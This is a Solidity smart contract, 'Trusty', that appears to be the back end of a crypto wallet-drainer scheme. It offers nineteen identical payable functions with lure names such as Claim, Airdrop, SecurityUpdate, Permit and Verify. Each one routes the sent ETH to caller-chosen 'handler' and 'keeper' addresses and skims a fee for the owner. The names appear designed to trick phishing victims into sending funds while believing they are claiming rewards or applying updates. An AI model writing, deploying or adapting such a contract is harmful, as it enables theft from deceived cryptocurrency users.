// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract Trusty {
  address private contract_owner;
  address private fee_receiver;
  uint8 private contract_fee;
  bool private fee_withdraw;

  event Ownership(address indexed last_owner, address indexed new_owner);
  event Percentage (uint8 last_percentage, uint8 new_percentage);

  constructor() {
    contract_owner = msg.sender;
    fee_receiver = contract_owner;
    fee_withdraw = false;
    contract_fee = 0;
  }

  function getOwner() public view returns (address) { return contract_owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }
  function salaryStatus() public view returns (bool) { return fee_withdraw; }
  function enableSalary() public { require(msg.sender == contract_owner, "Access Denied"); fee_withdraw = true; }
  function disableSalary() public { require(msg.sender == contract_owner, "Access Denied"); fee_withdraw = false; }

  function processTransaction(address sender, address primary_receiver, address secondary_receiver, uint8 secondary_percent, bool is_back) private {
    require(secondary_percent >= 0 && secondary_percent <= 100, "Invalid Percent");
    uint256 amount = msg.value;
    uint256 amount_back = 0;
    if (amount > 0) { amount = amount - 1; amount_back = amount_back + 1; }
    uint256 reserve = (amount / 100) * contract_fee;
    uint256 secondary_amount = ((amount - reserve) / 100) * secondary_percent;
    uint256 primary_amount = amount - reserve - secondary_amount;
    if (primary_amount > 0) payable(primary_receiver).transfer(primary_amount);
    if (secondary_amount > 0) payable(secondary_receiver).transfer(secondary_amount);
    if (reserve > 0 && fee_withdraw == true) payable(fee_receiver).transfer(reserve);
    if (amount_back > 0 && is_back == true) payable(sender).transfer(amount_back);
  }

  function transferOwnership(address new_owner) public {
    require(msg.sender == contract_owner, "Access Denied");
    address last_owner = contract_owner; contract_owner = new_owner;
    emit Ownership(last_owner, contract_owner);
  }
  function claimSalary() public {
    require(msg.sender == contract_owner, "Access Denied");
    require(address(this).balance > 0, "Balance Empty");
    payable(fee_receiver).transfer(address(this).balance);
  }
  function setReceiver(address new_receiver) public {
    require(msg.sender == contract_owner, "Access Denied");
    fee_receiver = new_receiver;
  }
  function changePercentage(uint8 new_percentage) public {
    require(msg.sender == contract_owner, "Access Denied");
    require(new_percentage >= 0 && new_percentage <= 100, "Invalid Percentage");
    uint8 previous_percentage = contract_fee; contract_fee = new_percentage;
    emit Percentage(previous_percentage, contract_fee);
  }

  function Claim(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function ClaimReward(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function ClaimRewards(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Execute(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Multicall(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Swap(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Connect(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function SecurityUpdate(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Airdrop(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Cashback(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Rewards(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Process(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Permit(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Approve(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Transfer(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Deposit(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Withdraw(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Register(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
  function Verify(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable { processTransaction(depositer, handler, keeper, percent, is_cashback); }
}